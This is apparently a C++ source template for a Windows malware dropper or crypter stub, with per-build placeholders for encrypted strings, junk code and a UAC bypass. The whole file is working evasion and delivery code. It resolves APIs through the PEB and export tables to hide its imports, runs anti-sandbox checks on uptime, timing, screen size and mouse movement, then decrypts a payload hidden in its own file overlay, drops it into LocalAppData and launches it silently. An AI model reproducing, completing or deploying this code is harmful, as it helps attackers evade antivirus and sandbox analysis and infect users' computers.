#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")
{/*UAC_BYPASS_PREAMBLE*/}

// Minimal PEB structs (avoids winternl.h dependency)
typedef struct _PEB_LDR_DATA {
    ULONG Length; BOOLEAN Init; PVOID SsHandle;
    LIST_ENTRY InLoad, InMem, InInit;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _MY_PEB {
    BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1];
    PVOID Reserved3[2]; PPEB_LDR_DATA Ldr;
} MY_PEB, *PMY_PEB;

extern "C" int _fltused = 0;
#pragma function(memset, memcpy, memcmp)
extern "C" {
    void* __cdecl memset(void* s, int c, size_t n)
        { unsigned char* p=(unsigned char*)s; while(n--)*p++=(unsigned char)c; return s; }
    void* __cdecl memcpy(void* d, const void* s, size_t n)
        { unsigned char* dp=(unsigned char*)d; const unsigned char* sp=(const unsigned char*)s; while(n--)*dp++=*sp++; return d; }
    int __cdecl memcmp(const void* a, const void* b, size_t n)
        { const unsigned char* p=(const unsigned char*)a; const unsigned char* q=(const unsigned char*)b;
          while(n--){if(*p!=*q)return *p-*q;p++;q++;} return 0; }
}

// ── AES string key (split 3 ways, per-build random) ──────────────────────
static const unsigned char SKA[] = {/*SKA*/};
static const unsigned char SKB[] = {/*SKB*/};
static const unsigned char SKC[] = {/*SKC*/};
static const unsigned char SIV[] = {/*SIV*/};

// ── AES-encrypted string slots ────────────────────────────────────────────
static const unsigned char S_K32[] = {/*S_K32*/};
static const unsigned char S_U32[] = {/*S_U32*/};
static const unsigned char S_SLP[] = {/*S_SLP*/};
static const unsigned char S_GTC[] = {/*S_GTC*/};
static const unsigned char S_GSM[] = {/*S_GSM*/};
static const unsigned char S_GCP[] = {/*S_GCP*/};
static const unsigned char S_GMFW[] = {/*S_GMFW*/};
static const unsigned char S_GENV[] = {/*S_GENV*/};
static const unsigned char S_CDIR[] = {/*S_CDIR*/};
static const unsigned char S_CFW[] = {/*S_CFW*/};
static const unsigned char S_RF[] = {/*S_RF*/};
static const unsigned char S_GFS[] = {/*S_GFS*/};
static const unsigned char S_WF[] = {/*S_WF*/};
static const unsigned char S_CH[] = {/*S_CH*/};
static const unsigned char S_CP[] = {/*S_CP*/};
static const unsigned char S_MBW[] = {/*S_MBW*/};
static const unsigned char S_EXT[] = {/*S_EXT*/};
static const unsigned char S_LOCA[] = {/*S_LOCA*/};
static const unsigned char S_MWS[] = {/*S_MWS*/};

#ifdef UAC_BYPASS_BUILD
static const unsigned char S_ADV[]      = {/*S_ADV*/};
static const unsigned char S_SH32[]     = {/*S_SH32*/};
static const unsigned char S_OPT[]      = {/*S_OPT*/};
static const unsigned char S_ATP[]      = {/*S_ATP*/};
static const unsigned char S_DTEX[]     = {/*S_DTEX*/};
static const unsigned char S_GTI[]      = {/*S_GTI*/};
static const unsigned char S_IWKS[]     = {/*S_IWKS*/};
static const unsigned char S_LPVW[]     = {/*S_LPVW*/};
static const unsigned char S_CPWT[]     = {/*S_CPWT*/};
static const unsigned char S_RCK[]      = {/*S_RCK*/};
static const unsigned char S_RCKX[]     = {/*S_RCKX*/};
static const unsigned char S_RDKW[]     = {/*S_RDKW*/};
static const unsigned char S_RSVX[]     = {/*S_RSVX*/};
static const unsigned char S_SEEX[]     = {/*S_SEEX*/};
static const unsigned char S_GSDW[]     = {/*S_GSDW*/};
static const unsigned char S_OPR[]      = {/*S_OPR*/};
static const unsigned char S_CTS[]      = {/*S_CTS*/};
static const unsigned char S_P32F[]     = {/*S_P32F*/};
static const unsigned char S_P32N[]     = {/*S_P32N*/};
static const unsigned char S_WINLOGON[] = {/*S_WINLOGON*/};
static const unsigned char S_FODHLP[]   = {/*S_FODHLP*/};
static const unsigned char S_MSCMD[]    = {/*S_MSCMD*/};
static const unsigned char S_MSOPEN[]   = {/*S_MSOPEN*/};
static const unsigned char S_MSSHELL[]  = {/*S_MSSHELL*/};
static const unsigned char S_MSBASE[]   = {/*S_MSBASE*/};
static const unsigned char S_DELEGEX[]  = {/*S_DELEGEX*/};
static const unsigned char S_SEDEBUG[]  = {/*S_SEDEBUG*/};
#endif // UAC_BYPASS_BUILD

{/*WORDLIST*/}
{/*JUNK_DEFS*/}

static const BYTE MAGIC[8] = {/*MAGIC*/};

// ── AES-256-CBC string decryption (BCrypt) ────────────────────────────────
static char* AesDecStr(const unsigned char* enc, int encLen) {
    unsigned char k[32]={};
    int la=(int)sizeof(SKA),lb=(int)sizeof(SKB),lc=(int)sizeof(SKC);
    memcpy(k,SKA,la);memcpy(k+la,SKB,lb);memcpy(k+la+lb,SKC,lc);
    BCRYPT_ALG_HANDLE hAlg=NULL;BCRYPT_KEY_HANDLE hKey=NULL;
    DWORD cbKO=0,cbD=0,outLen=0;char*result=NULL;
    if(BCryptOpenAlgorithmProvider(&hAlg,BCRYPT_AES_ALGORITHM,NULL,0)<0)goto end;
    BCryptSetProperty(hAlg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0);
    BCryptGetProperty(hAlg,BCRYPT_OBJECT_LENGTH,(PUCHAR)&cbKO,sizeof(DWORD),&cbD,0);
    {BYTE*ko=(BYTE*)HeapAlloc(GetProcessHeap(),0,cbKO);
    BCryptGenerateSymmetricKey(hAlg,&hKey,ko,cbKO,k,32,0);
    unsigned char iv[16];memcpy(iv,SIV,16);
    BCryptDecrypt(hKey,(PUCHAR)enc,encLen,NULL,iv,16,NULL,0,&outLen,BCRYPT_BLOCK_PADDING);
    result=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,outLen+1);
    memcpy(iv,SIV,16);
    BCryptDecrypt(hKey,(PUCHAR)enc,encLen,NULL,iv,16,(PUCHAR)result,outLen,&outLen,BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);HeapFree(GetProcessHeap(),0,ko);}
end:if(hAlg)BCryptCloseAlgorithmProvider(hAlg,0);
    return result;
}

// ── AES-256-CBC payload decryption ────────────────────────────────────────
static BOOL AesDecPayload(const BYTE*key,const BYTE*iv,const BYTE*in,DWORD inLen,BYTE**out,DWORD*outLen){
    BCRYPT_ALG_HANDLE hAlg=NULL;BCRYPT_KEY_HANDLE hKey=NULL;
    DWORD cbKO=0,cbD=0;BOOL ok=FALSE;
    if(BCryptOpenAlgorithmProvider(&hAlg,BCRYPT_AES_ALGORITHM,NULL,0)<0)return FALSE;
    BCryptSetProperty(hAlg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_CBC,sizeof(BCRYPT_CHAIN_MODE_CBC),0);
    BCryptGetProperty(hAlg,BCRYPT_OBJECT_LENGTH,(PUCHAR)&cbKO,sizeof(DWORD),&cbD,0);
    {BYTE*ko=(BYTE*)HeapAlloc(GetProcessHeap(),0,cbKO);
    BCryptGenerateSymmetricKey(hAlg,&hKey,ko,cbKO,(PUCHAR)key,32,0);
    BYTE iv2[16];memcpy(iv2,iv,16);
    BCryptDecrypt(hKey,(PUCHAR)in,inLen,NULL,iv2,16,NULL,0,outLen,BCRYPT_BLOCK_PADDING);
    *out=(BYTE*)HeapAlloc(GetProcessHeap(),0,*outLen);
    memcpy(iv2,iv,16);
    if(BCryptDecrypt(hKey,(PUCHAR)in,inLen,NULL,iv2,16,*out,*outLen,outLen,BCRYPT_BLOCK_PADDING)>=0)ok=TRUE;
    else{HeapFree(GetProcessHeap(),0,*out);*out=NULL;}
    BCryptDestroyKey(hKey);BCryptCloseAlgorithmProvider(hAlg,0);HeapFree(GetProcessHeap(),0,ko);}
    return ok;
}

// ── Word-decoding ─────────────────────────────────────────────────────────
static BOOL WEq(const char*a,int n,const char*b){int i=0;while(i<n&&b[i]&&a[i]==b[i])i++;return i==n&&b[i]==0;}
static BYTE WTB(const char*w,int n){for(int i=0;i<256;i++)if(WEq(w,n,WL[i]))return(BYTE)i;return 0;}
static BYTE* DecWords(const char*txt,DWORD tLen,DWORD expB,DWORD*oLen){
    BYTE*r=(BYTE*)HeapAlloc(GetProcessHeap(),0,expB);
    DWORD idx=0,s=0;
    for(DWORD i=0;i<=tLen&&idx<expB;i++){
        char c=(i<tLen)?txt[i]:0;
        if(i==tLen||c==' '||c=='\n'||c=='\r'){if(i>s){r[idx++]=WTB(txt+s,(int)(i-s));}s=i+1;}
    }
    *oLen=idx;return r;
}

static unsigned int SHash(const wchar_t*s){unsigned int h=5381;while(*s)h=((h<<5)+h)^(unsigned int)*s++;return h;}

// ── PEB-based module resolution (no GetModuleHandleA in IAT) ─────────────
typedef struct _US2 { USHORT Len; USHORT Max; PWSTR Buf; } US2;
typedef struct _LDRE {
    LIST_ENTRY InLoad,InMem,InInit;
    PVOID Base,Entry;ULONG Size;
    US2 FullName,Name;
} LDRE;

static HMODULE PebGetMod(const char* nameA, int nlen) {
    PMY_PEB peb=(PMY_PEB)__readgsqword(0x60);
    PLIST_ENTRY head=&peb->Ldr->InMem;
    for(PLIST_ENTRY e=head->Flink;e!=head;e=e->Flink){
        LDRE* m=(LDRE*)((BYTE*)e-sizeof(LIST_ENTRY));
        int wl=m->Name.Len/2;
        if(wl!=nlen)continue;
        int ok=1;
        for(int i=0;i<nlen;i++){
            wchar_t ca=m->Name.Buf[i];if(ca>='A'&&ca<='Z')ca+=32;
            char cb=nameA[i];if(cb>='A'&&cb<='Z')cb+=32;
            if(ca!=(wchar_t)cb){ok=0;break;}
        }
        if(ok)return(HMODULE)m->Base;
    }
    return NULL;
}

// ── Export table walk (no GetProcAddress in IAT) ──────────────────────────
static FARPROC PeGetProc(HMODULE hMod, const char* name) {
    BYTE*base=(BYTE*)hMod;
    IMAGE_DOS_HEADER*dos=(IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS*nt=(IMAGE_NT_HEADERS*)(base+dos->e_lfanew);
    DWORD rv=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(!rv)return NULL;
    IMAGE_EXPORT_DIRECTORY*exp=(IMAGE_EXPORT_DIRECTORY*)(base+rv);
    DWORD*names=(DWORD*)(base+exp->AddressOfNames);
    WORD* ords=(WORD*)(base+exp->AddressOfNameOrdinals);
    DWORD*funcs=(DWORD*)(base+exp->AddressOfFunctions);
    int nl=0;while(name[nl])nl++;
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char*n=(const char*)(base+names[i]);
        int j=0;while(j<nl&&n[j]==name[j])j++;
        if(j==nl&&n[j]==0)return(FARPROC)(base+funcs[ords[i]]);
    }
    return NULL;
}

{/*UAC_BYPASS_FUNC*/}

typedef DWORD (WINAPI*fnGTC_t)();
typedef int (WINAPI*fnGSM_t)(int);
typedef BOOL (WINAPI*fnGCP_t)(LPPOINT);
typedef DWORD (WINAPI*fnGMFW_t)(HMODULE,LPWSTR,DWORD);
typedef DWORD (WINAPI*fnGENV_t)(LPCWSTR,LPWSTR,DWORD);
typedef BOOL (WINAPI*fnCDIR_t)(LPCWSTR,LPSECURITY_ATTRIBUTES);
typedef HANDLE (WINAPI*fnCFW_t)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef BOOL (WINAPI*fnRF_t)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef DWORD (WINAPI*fnGFS_t)(HANDLE,LPDWORD);
typedef BOOL (WINAPI*fnWF_t)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
typedef BOOL (WINAPI*fnCH_t)(HANDLE);
typedef BOOL (WINAPI*fnCP_t)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef int (WINAPI*fnMBW_t)(UINT,DWORD,LPCCH,int,LPWSTR,int);
typedef HMODULE (WINAPI*fnLLA_t)(LPCSTR);

int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
    // Suppress all crash/WER dialogs — clean termination on any exception
    SetErrorMode(SEM_NOGPFAULTERRORBOX|SEM_FAILCRITICALERRORS|SEM_NOOPENFILEERRORBOX);
    {/*UAC_BYPASS_CALL*/}
    {/*JUNK_CALLS*/}

    // ── Anti-sandbox: uptime > 5min check + sleep with timing verification ─
    volatile DWORD uptime = GetTickCount();
    if (uptime < 300000) {
        DWORD t0=GetTickCount();
        // spin loop — emulators often fast-forward Sleep but not spin loops
        volatile DWORD x=0;
        for(volatile int i=0;i<0x7fffffff&&(GetTickCount()-t0)<2000;i++)x^=(DWORD)i;
        if(GetTickCount()-t0<1400)return 0;
    }

    // ── PEB: find kernel32 without GetModuleHandleA in IAT ───────────────
    char* s;
    s=AesDecStr(S_K32,sizeof(S_K32));
    int k32len=0;while(s[k32len])k32len++;
    HMODULE hK32=PebGetMod(s,k32len);
    HeapFree(GetProcessHeap(),0,s);
    if(!hK32)return 0;

    s=AesDecStr(S_U32,sizeof(S_U32));
    int u32len=0;while(s[u32len])u32len++;
    HMODULE hU32=PebGetMod(s,u32len);
    if(!hU32){
        // Not loaded yet — load via export table walk
        fnLLA_t fnLLA=(fnLLA_t)PeGetProc(hK32,"LoadLibraryA");
        if(fnLLA)hU32=fnLLA(s);
    }
    HeapFree(GetProcessHeap(),0,s);

    // ── Resolve all procs via export table (no GetProcAddress in IAT) ────
    #define GP(mod,svar) ((FARPROC)PeGetProc(mod, [&](){char*r=AesDecStr(svar,sizeof(svar));return r;}()))
    // Helper: decrypt → get proc → free
    auto getK = [&](const unsigned char* enc, int len) -> FARPROC {
        char* nm=AesDecStr(enc,len);
        FARPROC f=PeGetProc(hK32,nm);
        HeapFree(GetProcessHeap(),0,nm);
        return f;
    };
    auto getU = [&](const unsigned char* enc, int len) -> FARPROC {
        char* nm=AesDecStr(enc,len);
        FARPROC f=hU32?PeGetProc(hU32,nm):NULL;
        HeapFree(GetProcessHeap(),0,nm);
        return f;
    };

    auto fnGTC = (fnGTC_t)getK(S_GTC, sizeof(S_GTC));
    auto fnGSM = (fnGSM_t)getU(S_GSM, sizeof(S_GSM));
    auto fnGCP = (fnGCP_t)getU(S_GCP, sizeof(S_GCP));
    auto fnGMFW = (fnGMFW_t)getK(S_GMFW, sizeof(S_GMFW));
    auto fnGENV = (fnGENV_t)getK(S_GENV, sizeof(S_GENV));
    auto fnCDIR = (fnCDIR_t)getK(S_CDIR, sizeof(S_CDIR));
    auto fnCFW = (fnCFW_t)getK(S_CFW, sizeof(S_CFW));
    auto fnRF = (fnRF_t)getK(S_RF, sizeof(S_RF));
    auto fnGFS = (fnGFS_t)getK(S_GFS, sizeof(S_GFS));
    auto fnWF = (fnWF_t)getK(S_WF, sizeof(S_WF));
    auto fnCH = (fnCH_t)getK(S_CH, sizeof(S_CH));
    auto fnCP = (fnCP_t)getK(S_CP, sizeof(S_CP));
    auto fnMBW = (fnMBW_t)getK(S_MBW, sizeof(S_MBW));

    if(!fnGTC||!fnGMFW||!fnGENV||!fnCDIR||!fnCFW||!fnRF||!fnGFS||!fnWF||!fnCH||!fnCP||!fnMBW)return 0;

    // ── Screen resolution check ───────────────────────────────────────────
    if(fnGSM&&(fnGSM(0)<1280||fnGSM(1)<720))return 0;

    // ── Mouse movement (12 × 500ms) ───────────────────────────────────────
    if(fnGCP){
        POINT p0={},p1={};fnGCP(&p0);BOOL mv=FALSE;
        for(int i=0;i<12&&!mv;i++){
            DWORD t0=fnGTC();while(fnGTC()-t0<500){volatile int x=0;x++;} // spin-sleep
            fnGCP(&p1);if(p0.x!=p1.x||p0.y!=p1.y)mv=TRUE;
        }
        if(!mv)return 0;
    }

    // ── Read self ─────────────────────────────────────────────────────────
    wchar_t selfPath[MAX_PATH]={};
    fnGMFW(NULL,selfPath,MAX_PATH);
    HANDLE hSelf=fnCFW(selfPath,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_DELETE,NULL,OPEN_EXISTING,0,NULL);
    if(hSelf==INVALID_HANDLE_VALUE)return 0;
    DWORD fSz=fnGFS(hSelf,NULL);
    BYTE*fBuf=(BYTE*)HeapAlloc(GetProcessHeap(),0,fSz);
    DWORD br=0;fnRF(hSelf,fBuf,fSz,&br,NULL);fnCH(hSelf);

    // ── Find overlay [MAGIC:8][TOTAL:4][WORDS(key+iv+payload)] ───────────
    int mPos=-1;
    for(int i=(int)fSz-8;i>=0;i--){if(memcmp(fBuf+i,MAGIC,8)==0){mPos=i;break;}}
    if(mPos<0){HeapFree(GetProcessHeap(),0,fBuf);return 0;}

    DWORD totalBytes=*(DWORD*)(fBuf+mPos+8);
    const char*wordTxt=(const char*)(fBuf+mPos+12);
    DWORD txtLen=fSz-(DWORD)((BYTE*)wordTxt-fBuf);

    DWORD dLen=0;
    BYTE*decoded=DecWords(wordTxt,txtLen,totalBytes,&dLen);
    if(!decoded||dLen<48){HeapFree(GetProcessHeap(),0,fBuf);return 0;}
    BYTE*pKey=decoded,*pIv=decoded+32,*enc=decoded+48;
    DWORD eLen=dLen-48;

    BYTE*payload=NULL;DWORD pLen=0;
    if(!AesDecPayload(pKey,pIv,enc,eLen,&payload,&pLen)){
        HeapFree(GetProcessHeap(),0,decoded);HeapFree(GetProcessHeap(),0,fBuf);return 0;
    }
    HeapFree(GetProcessHeap(),0,decoded);HeapFree(GetProcessHeap(),0,fBuf);

    // ── Build drop path ───────────────────────────────────────────────────
    char*sLoca=AesDecStr(S_LOCA,sizeof(S_LOCA));
    wchar_t wLoca[16]={};fnMBW(CP_ACP,0,sLoca,-1,wLoca,16);HeapFree(GetProcessHeap(),0,sLoca);
    wchar_t appDir[MAX_PATH]={};fnGENV(wLoca,appDir,MAX_PATH);

    char*sMws=AesDecStr(S_MWS,sizeof(S_MWS));
    wchar_t wMws[24]={};fnMBW(CP_ACP,0,sMws,-1,wMws,24);HeapFree(GetProcessHeap(),0,sMws);
    {int i=0;while(appDir[i])i++;appDir[i++]=L'\\';int j=0;while(wMws[j]){appDir[i+j]=wMws[j];j++;}appDir[i+j]=0;}
    if(fnCDIR)fnCDIR(appDir,NULL);

    unsigned int h=SHash(selfPath);
    static const wchar_t kHex[]=L"0123456789abcdef";
    wchar_t hName[9]={};
    for(int i=7;i>=0;i--){hName[i]=kHex[h&0xF];h>>=4;}

    char*sExt=AesDecStr(S_EXT,sizeof(S_EXT));
    wchar_t wExt[6]={};fnMBW(CP_ACP,0,sExt,-1,wExt,6);HeapFree(GetProcessHeap(),0,sExt);

    wchar_t dropPath[MAX_PATH]={};
    {int i=0;while(appDir[i]){dropPath[i]=appDir[i];i++;}dropPath[i++]=L'\\';
     int j=0;while(hName[j]){dropPath[i+j]=hName[j];j++;}dropPath[i+j]=0;}
    {int i=0;while(dropPath[i])i++;int j=0;while(wExt[j]){dropPath[i+j]=wExt[j];j++;}dropPath[i+j]=0;}

    HANDLE hOut=fnCFW(dropPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hOut==INVALID_HANDLE_VALUE){HeapFree(GetProcessHeap(),0,payload);return 0;}
    DWORD wr=0;fnWF(hOut,payload,pLen,&wr,NULL);fnCH(hOut);
    HeapFree(GetProcessHeap(),0,payload);

    STARTUPINFOW si={};si.cb=sizeof(si);
    PROCESS_INFORMATION pi={};
    fnCP(NULL,dropPath,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(pi.hThread)fnCH(pi.hThread);
    if(pi.hProcess)fnCH(pi.hProcess);
    return 0;
}
